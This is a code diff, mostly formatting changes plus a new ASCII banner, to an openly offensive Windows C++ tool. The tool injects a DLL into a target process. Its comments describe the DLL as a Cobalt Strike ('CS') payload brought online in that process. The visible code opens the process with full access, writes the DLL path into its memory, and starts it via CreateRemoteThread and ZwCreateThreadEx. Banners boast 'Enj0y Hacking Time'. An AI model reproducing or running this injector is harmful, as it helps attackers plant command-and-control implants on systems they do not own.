@@ -47,10 +47,10 @@ DWORD GetProcessPID(LPCTSTR lpProcessName)
 	return Ret;
 }
 
-void DLLInject(DWORD pid,LPCWSTR dllpath)
+void DLLInject(DWORD pid, LPCWSTR dllpath)
 {
 	//1.获取句柄
-	HANDLE OriginalProcessHandle = OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid);
+	HANDLE OriginalProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
 	if (OriginalProcessHandle == NULL)
 	{
 		cout << "	[-] Get TargetProcessHandle Failed :(" << endl;
@@ -74,16 +74,18 @@ void DLLInject(DWORD pid,LPCWSTR dllpath)
 	{
 		cout << "	[-] VirtualAlloc Address Failed :(" << endl;
 		return;
-	}else {
+	}
+	else {
 		cout << "	[*] VirtualAlloc Address Successfully :)" << endl;
-	} 
+	}
 	//3.将CS上线的DLL写入内存
-	BOOL WriteStatus = WriteProcessMemory(OriginalProcessHandle,RemoteMemory,dllpath,length,NULL);
+	BOOL WriteStatus = WriteProcessMemory(OriginalProcessHandle, RemoteMemory, dllpath, length, NULL);
 	if (WriteStatus == 0)
 	{
 		cout << "	[-] Write CS's DLL Into Memory Failed :(" << endl;
 		return;
-	}else
+	}
+	else
 	{
 		cout << "	[*] Write CS's DLL Into Memory Successfully :)" << endl;
 	}
@@ -91,84 +93,96 @@ void DLLInject(DWORD pid,LPCWSTR dllpath)
 	//4.获取LoadLibrary地址
 	FARPROC LoadLibraryHandle = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
 	//5.声明ZwCreateThreadEx函数
-	#ifdef _WIN64
-		typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
-			PHANDLE ThreadHandle,
-			ACCESS_MASK DesiredAccess,
-			LPVOID ObjectAttributes,
-			HANDLE ProcessHandle,
-			LPTHREAD_START_ROUTINE lpStartAddress,
-			LPVOID lpParameter,
-			ULONG CreateThreadFlags,
-			SIZE_T ZeroBits,
-			SIZE_T StackSize,
-			SIZE_T MaximumStackSize,
-			LPVOID pUnkown);
-	#else
-		typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
-			PHANDLE ThreadHandle,
-			ACCESS_MASK DesiredAccess,
-			LPVOID ObjectAttributes,
-			HANDLE ProcessHandle,
-			LPTHREAD_START_ROUTINE lpStartAddress,
-			LPVOID lpParameter,
-			BOOL CreateSuspended,
-			DWORD dwStackSize,
-			DWORD dw1,
-			DWORD dw2,
-			LPVOID pUnkown);
-	#endif
+#ifdef _WIN64
+	typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
+		PHANDLE ThreadHandle,
+		ACCESS_MASK DesiredAccess,
+		LPVOID ObjectAttributes,
+		HANDLE ProcessHandle,
+		LPTHREAD_START_ROUTINE lpStartAddress,
+		LPVOID lpParameter,
+		ULONG CreateThreadFlags,
+		SIZE_T ZeroBits,
+		SIZE_T StackSize,
+		SIZE_T MaximumStackSize,
+		LPVOID pUnkown);
+#else
+	typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
+		PHANDLE ThreadHandle,
+		ACCESS_MASK DesiredAccess,
+		LPVOID ObjectAttributes,
+		HANDLE ProcessHandle,
+		LPTHREAD_START_ROUTINE lpStartAddress,
+		LPVOID lpParameter,
+		BOOL CreateSuspended,
+		DWORD dwStackSize,
+		DWORD dw1,
+		DWORD dw2,
+		LPVOID pUnkown);
+#endif
 	//6.获取NTDLL中ZwCreateThreadEx函数
-	 typedef_ZwCreateThreadEx  ZwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "ZwCreateThreadEx");
-	 if (ZwCreateThreadEx == NULL)
-	 {
-		 cout << "	[-] Get ZwCreateThreadEx Address Failed :(" << endl;
-		 return;
-	 }
-	 else {
-		 cout << "	[*] Get ZwCreateThreadEx Address Successfully :)" << endl;
-	 }
+	typedef_ZwCreateThreadEx  ZwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "ZwCreateThreadEx");
+	if (ZwCreateThreadEx == NULL)
+	{
+		cout << "	[-] Get ZwCreateThreadEx Address Failed :(" << endl;
+		return;
+	}
+	else {
+		cout << "	[*] Get ZwCreateThreadEx Address Successfully :)" << endl;
+	}
 	//5.创建线程 ring3调用CreateRemoteThread
-	HANDLE RemoteHandle = CreateRemoteThread(OriginalProcessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryHandle, RemoteMemory,0,NULL);
+	HANDLE RemoteHandle = CreateRemoteThread(OriginalProcessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryHandle, RemoteMemory, 0, NULL);
 	if (RemoteHandle == NULL)
 	{
 		cout << "	[-] Ring3 Thread Inject Failed :(" << endl;
 		return;
-		
-	}else {
+
+	}
+	else {
 		cout << "	[*] Ring3 Thread Inject Successfully :)" << endl;
 	}
-	
+
 	//7.创建线程  ring0调用ZwCreateThreadEx
-	 HANDLE hRemoteThread;
-	 DWORD Status = 0;
-	 Status = ZwCreateThreadEx(&hRemoteThread,PROCESS_ALL_ACCESS,NULL,OriginalProcessHandle,(LPTHREAD_START_ROUTINE)LoadLibraryHandle,RemoteMemory,0,0,0,0,NULL);
-	 if (Status == NULL)
-	 {
-		 cout << "	[*] Ring0 Thread Inject Successfully :)" << endl;
-	 }
-	 else
-	 {
-		 cout << "	[-] Ring0 Thread Inject Failed :(" << endl;
-		 return;
-	 }
-	 WaitForSingleObject(RemoteHandle, -1);
- 	 //8.释放DLL空间
+	HANDLE hRemoteThread;
+	DWORD Status = 0;
+	Status = ZwCreateThreadEx(&hRemoteThread, PROCESS_ALL_ACCESS, NULL, OriginalProcessHandle, (LPTHREAD_START_ROUTINE)LoadLibraryHandle, RemoteMemory, 0, 0, 0, 0, NULL);
+	if (Status == NULL)
+	{
+		cout << "	[*] Ring0 Thread Inject Successfully :)" << endl;
+	}
+	else
+	{
+		cout << "	[-] Ring0 Thread Inject Failed :(" << endl;
+		return;
+	}
+	WaitForSingleObject(RemoteHandle, -1);
+	//8.释放DLL空间
 	VirtualFreeEx(OriginalProcessHandle, RemoteMemory, length, MEM_COMMIT);
-	 //9.关闭句柄
+	//9.关闭句柄
 	CloseHandle(OriginalProcessHandle);
 	CloseHandle(ZwCreateThreadEx);
 	cout << "	[*] DLL inj&ct successfu11y !! Enj0y Hacking Time :) !" << endl;
 }
 
 
-int _tmain(int argc,TCHAR * argv[])
+int _tmain(int argc, TCHAR* argv[])
 {
-
+	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
+	SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_BLUE);
 	if (argc == 3) {
-		HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
-		SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
-		cout << endl << "	    Under the sun,there is no secure system!!" << endl << "	        Scripted By Whoami@127.0.0.1  :》" << endl;
+		std::cout << "▓█████▄  ██▓     ██▓     ██▓ ███▄    █  ▄▄▄██▓▓▓▓█████  ▄████▄  ▄▄▄█████▓\n";
+		std::cout << "▓██▓ ██▌▓██▓    ▓██▓    ▓██▓ ██ ▓█   █    ▓██   ▓█   ▓ ▓██▓ ▓█  ▓  ██▓ ▓▓\n";
+		std::cout << "▓██   █▌▓██▓    ▓██▓    ▓██▓▓██  ▓█ ██▓   ▓██   ▓███   ▓▓█    ▄ ▓ ▓██▓ ▓▓\n";
+		std::cout << "▓▓█▄   ▌▓██▓    ▓██▓    ▓██▓▓██▓  ▓▌██▓▓██▄██▓  ▓▓█  ▄ ▓▓▓▄ ▄██▓▓ ▓██▓ ▓ \n";
+		std::cout << "▓▓████▓ ▓██████▓▓██████▓▓██▓▓██▓   ▓██▓ ▓███▓   ▓▓████▓▓ ▓███▓ ▓  ▓██▓ ▓ \n";
+		std::cout << " ▓▓  ▓ ▓ ▓▓▓  ▓▓ ▓▓▓  ▓▓▓  ▓ ▓▓   ▓ ▓  ▓▓▓▓▓   ▓▓ ▓▓ ▓▓ ▓▓ ▓  ▓  ▓ ▓▓   \n";
+		std::cout << " ▓▓  ▓ ▓ ▓ ▓  ▓▓ ▓ ▓  ▓ ▓ ▓▓ ▓▓   ▓ ▓▓ ▓ ▓▓▓    ▓ ▓  ▓  ▓  ▓       ▓    \n";
+		std::cout << " ▓ ▓  ▓   ▓ ▓     ▓ ▓    ▓ ▓   ▓   ▓ ▓  ▓ ▓ ▓      ▓   ▓          ▓      \n";
+		std::cout << "   ▓        ▓  ▓    ▓  ▓ ▓           ▓  ▓   ▓      ▓  ▓▓ ▓                \n";
+		std::cout << " ▓                                                     ▓                    \n";
+		
+		SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
+		cout << endl << "	    Under the sun,there is no secure system!!" << endl << "	        Scripted By Whoami@127.0.0.1  :》"<<endl<<"	          Color Picked By Icy Water :)" << endl;
 		if (EnableDebugPrivilege() == TRUE)
 		{
 			//
@@ -182,8 +196,8 @@ int _tmain(int argc,TCHAR * argv[])
 		}
 
 		DWORD PID = GetProcessPID(argv[1]);  //必须小写
-		
-		DLLInject(PID,argv[2]);
+
+		DLLInject(PID, argv[2]);
 	}
 	else
 	{
